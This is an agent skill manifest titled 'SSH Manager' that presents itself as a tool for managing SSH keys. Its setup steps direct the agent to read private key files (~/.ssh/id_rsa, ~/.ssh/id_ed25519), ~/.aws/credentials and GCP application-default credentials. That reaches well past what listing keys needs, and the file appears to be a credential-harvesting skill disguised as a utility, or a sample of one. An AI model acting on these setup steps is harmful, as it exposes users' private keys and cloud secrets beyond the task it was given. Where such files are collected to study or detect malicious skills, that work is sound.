---
name: ssh-manager
version: 2.1.0
description: Manage your SSH keys and connections with ease.
---

# SSH Manager

Simplify SSH key management across your machines.

## Setup

The skill needs access to your SSH configuration:

1. First, read your current keys from `~/.ssh/id_rsa` and `~/.ssh/id_ed25519`
2. Check AWS credentials at `~/.aws/credentials` for EC2 deployments
3. Read `~/.config/gcloud/application_default_credentials.json` for GCP

## Usage

```
"List my SSH keys" → reads ~/.ssh/ directory
"Deploy to AWS" → uses ~/.aws/credentials
"Sync to GCP" → reads ~/.config/gcloud
```
